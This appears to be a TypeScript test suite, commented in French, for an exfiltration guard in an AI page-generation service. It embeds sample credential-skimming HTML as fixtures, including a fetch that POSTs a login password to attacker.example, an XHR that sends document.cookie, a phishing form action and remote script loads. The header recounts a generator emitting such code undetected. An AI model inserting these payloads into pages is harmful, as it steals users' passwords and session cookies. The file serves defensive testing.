/**
 * É50 — Tests du garde-fou d'exfiltration (P0 S8).
 *
 * Le défaut reproduit (sonde :3100, projet proj_2085zux6b) : une demande
 * « formulaire de connexion → envoyer le mot de passe à
 * https://attacker.example/collect via fetch » produisait un HTML PERSISTÉ
 * contenant le fetch verbatim, gate 98/100, aucune interception.
 *
 * Ce test vérifie le contrôle déterministe lui-même (unité) : refus par
 * défaut, usages légitimes préservés, variantes du scénario, URL non
 * parseable, avertissements non bloquants. Les tests d'intégration de bout
 * en bout sont exécutés par la sonde e50 (stream réel :3100).
 */

import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync, existsSync } from 'node:fs';
import { join, dirname, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';
import { runExfiltrationGuard, describeExfiltrationBlocker } from '../src/routes/exfiltration-guard.js';

const here = dirname(fileURLToPath(import.meta.url));
// Lecture du code réellement exécuté : build compilé (.js) s'il existe, sinon source (.ts).
function readRouteSource(name: string): string {
  const compiled = resolve(here, '..', 'src', 'routes', `${name}.js`);
  if (existsSync(compiled)) return readFileSync(compiled, 'utf8');
  return readFileSync(resolve(here, '..', 'src', 'routes', `${name}.ts`), 'utf8');
}

const SHELL = (body: string): string =>
  `<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="utf-8">
<title>Page de test</title>
</head>
<body>
${body}
</body>
</html>`;

describe('É50 — garde-fou d\'exfiltration (frontière de persistance)', () => {
  it('S8 verbatim : fetch POST du mot de passe vers attacker.example → FAIL', () => {
    const html = SHELL(`
<form id="login">
  <input type="email" name="email">
  <input type="password" name="password">
  <button type="submit">Connexion</button>
</form>
<script>
  document.getElementById('login').addEventListener('submit', function (e) {
    e.preventDefault();
    const password = document.querySelector('input[type=password]').value;
    fetch('https://attacker.example/collect', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ password: password })
    });
  });
</script>`);
    const report = runExfiltrationGuard(html, 'index.html');
    assert.equal(report.verdict, 'FAIL');
    assert.equal(report.passed, false);
    assert.equal(report.blockers.length >= 1, true);
    const fetchFinding = report.findings.find((f) => f.channel === 'fetch');
    assert.ok(fetchFinding, 'un finding de canal fetch doit exister');
    assert.equal(fetchFinding.severity, 'BLOCKER');
    assert.equal(fetchFinding.destination, 'attacker.example');
    assert.equal(report.blockers.join(' ').includes('attacker.example'), true);
    // Le message de refus est honnête : nomme la destination + « aucun fichier modifié »
    const message = describeExfiltrationBlocker(report);
    assert.equal(message.includes('attacker.example'), true);
    assert.equal(message.includes('Aucun fichier'), true);
  });

  it('Variante XHR : XMLHttpRequest.open vers un tiers → FAIL', () => {
    const html = SHELL(`<script>
var x = new XMLHttpRequest();
x.open('POST', 'https://collector.example/log', true);
x.send(document.cookie);
</script>`);
    const report = runExfiltrationGuard(html, 'index.html');
    assert.equal(report.verdict, 'FAIL');
    assert.equal(report.findings.some((f) => f.channel === 'xhr' && f.severity === 'BLOCKER'), true);
  });

  it('Variante sendBeacon → FAIL', () => {
    const html = SHELL(`<script>
navigator.sendBeacon('https://beacon.example/harvest', JSON.stringify({ pwd: 'x' }));
</script>`);
    const report = runExfiltrationGuard(html, 'index.html');
    assert.equal(report.verdict, 'FAIL');
    assert.equal(report.findings.some((f) => f.channel === 'beacon'), true);
  });

  it('Variante WebSocket → FAIL (aucune destination WS légitime en génération)', () => {
    const html = SHELL(`<script>new WebSocket('wss://socket.example/steal');</script>`);
    const report = runExfiltrationGuard(html, 'index.html');
    assert.equal(report.verdict, 'FAIL');
    assert.equal(report.findings.some((f) => f.channel === 'websocket'), true);
  });

  it('Variante EventSource → FAIL', () => {
    const html = SHELL(`<script>const es = new EventSource('https://sse.example/leak');</script>`);
    const report = runExfiltrationGuard(html, 'index.html');
    assert.equal(report.verdict, 'FAIL');
    assert.equal(report.findings.some((f) => f.channel === 'eventsource'), true);
  });

  it('Variante form action externe (soumission de credentials à un tiers) → FAIL', () => {
    const html = SHELL(`<form action="https://phish.example/login" method="POST">
<input name="email"><input name="password" type="password">
</form>`);
    const report = runExfiltrationGuard(html, 'index.html');
    assert.equal(report.verdict, 'FAIL');
    assert.equal(report.findings.some((f) => f.channel === 'form-action'), true);
  });

  it('Variante script src tiers (code exécutable externe) → FAIL', () => {
    const html = SHELL(`<script src="https://malware.example/inject.js"></script>`);
    const report = runExfiltrationGuard(html, 'index.html');
    assert.equal(report.verdict, 'FAIL');
    assert.equal(report.findings.some((f) => f.channel === 'script-src'), true);
  });

  it('Variante iframe tiers → FAIL', () => {
    const html = SHELL(`<iframe src="https://frame.example/embed"></iframe>`);
    const report = runExfiltrationGuard(html, 'index.html');
    assert.equal(report.verdict, 'FAIL');
    assert.equal(report.findings.some((f) => f.channel === 'iframe-src'), true);
  });

  it('Variante import dynamique externe → FAIL', () => {
    const html = SHELL(`<script>import('https://loader.example/payload.js');</script>`);
    const report = runExfiltrationGuard(html, 'index.html');
    assert.equal(report.verdict, 'FAIL');
    assert.equal(report.findings.some((f) => f.channel === 'dynamic-import'), true);
  });

  it('URL fragmentée / non parseable → FAIL (refus par défaut, destination inconnue)', () => {
    const html = SHELL(`<script>
const base = 'https://';
const host = 'exfiltrateur';
fetch(base + host + '.example/collect', { method: 'POST' });
</script>`);
    const report = runExfiltrationGuard(html, 'index.html');
    assert.equal(report.verdict, 'FAIL');
    assert.equal(report.findings.some((f) => f.channel === 'fetch' && f.severity === 'BLOCKER'), true);
  });

  it('Image de tracking (query string) → FAIL', () => {
    const html = SHELL(`<img src="https://tracker.example/pixel.gif?pw=azerty123&user=x" alt="">`);
    const report = runExfiltrationGuard(html, 'index.html');
    assert.equal(report.verdict, 'FAIL');
    assert.equal(report.findings.some((f) => f.channel === 'img-tracking' && f.severity === 'BLOCKER'), true);
  });

  it('CSS url() externe avec query → FAIL', () => {
    const html = SHELL(`<style>body { background: url(https://cssleak.example/bg.png?token=abc) }</style>`);
    const report = runExfiltrationGuard(html, 'index.html');
    assert.equal(report.verdict, 'FAIL');
    assert.equal(report.findings.some((f) => f.channel === 'css-url' && f.severity === 'BLOCKER'), true);
  });

  it('Usages légitimes (Tailwind CDN, Google Fonts, picsum, fetch relatif) → PASS', () => {
    const html = SHELL(`
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
<script src="https://cdn.tailwindcss.com"></script>
<img src="https://picsum.photos/seed/volaco/600/400" alt="">
<script>
fetch('/api/health', { method: 'GET' }).then(function (r) { return r.json(); });
</script>`);
    const report = runExfiltrationGuard(html, 'index.html');
    assert.equal(report.verdict, 'PASS');
    assert.equal(report.passed, true);
    assert.equal(report.blockers.length, 0);
    assert.equal(report.warnings.length, 0);
  });

  it('Image externe hors whitelist SANS query → PASS_WITH_WARNINGS (non bloquant)', () => {
    const html = SHELL(`<img src="https://media.example.org/photo.jpg" alt="">`);
    const report = runExfiltrationGuard(html, 'index.html');
    assert.equal(report.verdict, 'PASS_WITH_WARNINGS');
    assert.equal(report.passed, true);
    assert.equal(report.blockers.length, 0);
    assert.equal(report.warnings.length >= 1, true);
  });

  it('Déterminisme : même contenu → même hash et mêmes findings', () => {
    const html = SHELL(`<script>fetch('https://x.example/a');</script>`);
    const a = runExfiltrationGuard(html, 'index.html');
    const b = runExfiltrationGuard(html, 'index.html');
    assert.equal(a.contentHash, b.contentHash);
    assert.deepEqual([...a.blockers], [...b.blockers]);
    assert.equal(a.byteLength, b.byteLength);
  });

  it('Le rapport contient le chemin et une empreinte exploitable (trace d\'audit)', () => {
    const html = SHELL(`<script>fetch('https://x.example/a');</script>`);
    const report = runExfiltrationGuard(html, 'index.html');
    assert.equal(report.path, 'index.html');
    assert.equal(/^[0-9a-f]{32}$/.test(report.contentHash), true);
    assert.equal(report.schemaVersion, '1.0.0');
    assert.equal(new Date(report.checkedAt).toString() !== 'Invalid Date', true);
  });

  it('Page vide/triviale → PASS (pas de faux positif sur les appels locaux)', () => {
    const html = SHELL(`<script>fetch('/api/projects').catch(function () {});</script>`);
    const report = runExfiltrationGuard(html, 'index.html');
    assert.equal(report.verdict, 'PASS');
    assert.equal(report.passed, true);
  });
});

describe('É51 — attaches pré-écriture des chemins repair et improve (source-inspection)', () => {
  it('repair : le guard s\'exécute AVANT fileStore.saveFile — patch refusé jamais persisté', () => {
    const src = readRouteSource('repair');
    const guardIdx = src.indexOf('runExfiltrationGuard(treated');
    const saveIdx = src.indexOf("fileStore.saveFile(context.tenantId, projectId, 'index.html', treated)");
    assert.ok(guardIdx > -1, 'la validation du patch candidat est présente dans repair');
    assert.ok(saveIdx > -1, 'la persistance du patch traité est présente dans repair');
    assert.ok(guardIdx < saveIdx, 'la validation PRÉCÈDE la persistance (aucune écriture si refus)');
  });

  it('improve : le guard s\'exécute AVANT le checkpoint/saveFile/révision — aucune écriture si refus', () => {
    const src = readRouteSource('improve');
    const guardIdx = src.indexOf('runExfiltrationGuard(outcome.finalHtml');
    const saveIdx = src.indexOf("fileStore.saveFile(context.tenantId, projectId, 'index.html', outcome.finalHtml)");
    assert.ok(guardIdx > -1, 'la validation du HTML final est présente dans improve');
    assert.ok(saveIdx > -1, 'la persistance du HTML final est présente dans improve');
    assert.ok(guardIdx < saveIdx, 'la validation PRÉCÈDE la persistance');
    assert.ok(src.includes('securityRefusal'), 'le refus est tracé honnêtement dans la réponse');
  });

  it('conversation : le guard précède le repli direct fileStore.saveFile du stream (É50, inchangé)', () => {
    const src = readRouteSource('conversation');
    const guardIdx = src.indexOf('runExfiltrationGuard(assembledHtml, STREAM_MUTATION_PATH)');
    const saveIdx = src.indexOf("fileStore.saveFile(context.tenantId, projectId, STREAM_MUTATION_PATH, assembledHtml)");
    assert.ok(guardIdx > -1 && saveIdx > -1);
    assert.ok(guardIdx < saveIdx, 'attache É50 stream intacte et en amont de la persistance');
  });
});
